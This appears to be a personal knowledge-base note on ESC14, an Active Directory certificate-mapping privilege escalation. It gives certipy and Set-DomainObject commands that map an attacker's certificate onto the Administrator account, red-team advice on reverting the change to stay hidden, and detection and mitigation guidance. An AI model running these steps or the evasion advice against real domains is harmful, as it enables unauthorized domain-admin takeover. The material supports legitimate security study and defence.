---
title: "ESC14 — weak explicit mapping via altSecurityIdentities"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [active-directory, ad-cs, esc, privilege-escalation, pkinit]
---

# ESC14

**Weak explicit certificate mapping.** The DC maps a cert to an account via
**explicit mappings** stored in the account's
**`altSecurityIdentities`** attribute. If the attacker holds
**`GenericWrite`** on a **privileged account** and the DC's mapping config
still accepts **weak explicit formats** (e.g. **Issuer+Subject** or **UPN**,
rather than the strong **Issuer+SerialNumber**), the attacker writes a
mapping that binds **their own already-held cert** to that account — and then
logs on with *their* cert as *that* account.

It's the explicit-mapping analog of [[esc9]]/[[esc10]] (the weak *implicit*
path) — same "bind a cert to someone else's identity" goal, but the binding
is written to the victim, not derived by weak implicit rules.

## The condition

- **`GenericWrite` on the target account** (via [[acl-abuse]]).
- DC accepts **weak explicit mapping formats** ([[certificate-mapping]]).
- The attacker **already holds a cert** (enrolled for themselves).

## Exploit

```bash
# 1. you hold a cert for yourself
certipy req -u user@corp.local -p 'Pass' -ca CORP-CA -template User

# 2. write a weak explicit mapping (Issuer+Subject / UPN) on the target DA
#    pointing at YOUR cert's issuer+subject, via GenericWrite
Set-DomainObject -Identity Administrator -Set @{
    'altSecurityIdentities' = '1.3.6.1.4.1.311.25.2=Issuer,Subject:<YOUR_CERT_ISSUER_SUBJECT>'
}

# 3. auth with your cert as the DA
certipy auth -pfx user.pfx -dc-ip <DC_IP> -upn administrator@corp.local
```

## Red-team notes (OPSEC)

- **The write is on the DA object** — a 5136 on `altSecurityIdentities` on a
  DA is one of the highest-fidelity PKI tells there is; do it, auth, and
  consider reverting (the cert stays valid, but the mapping is the visible
  part).
- **You don't need to touch the CA** — unlike most ESCs, the cert you use is
  an ordinary one you enrolled for yourself; the *mapping* is the privilege
  escalation.

## Detection

- **5136** on `altSecurityIdentities` of a privileged account (especially a
  mapping whose Issuer+Subject matches a cert held by a *different* account).
- **4768 PKINIT** for the privileged account using a cert that was issued to
  someone else (subject mismatch on the cert).

## Mitigations

- **Strong explicit mapping** — `Issuer+SerialNumber` only (drop
  Issuer+Subject / UPN from `CertificateMappingMethods`).
- **ACL `altSecurityIdentities`** — it's an account attribute; a writable one
  on a DA is a standing privilege grant.
- Alert on 5136 to `altSecurityIdentities` on Tier-1/Tier-0 objects.

## Links

- [[ad-cs-esc-attacks]] — ESC14 in the family
- [[certificate-mapping]] — implicit vs explicit mapping + weak formats
- [[esc9]], [[esc10]] — the weak *implicit* siblings
- [[acl-abuse]] — the GenericWrite prerequisite
- [[certipy]], [[certified-pre-owned]]
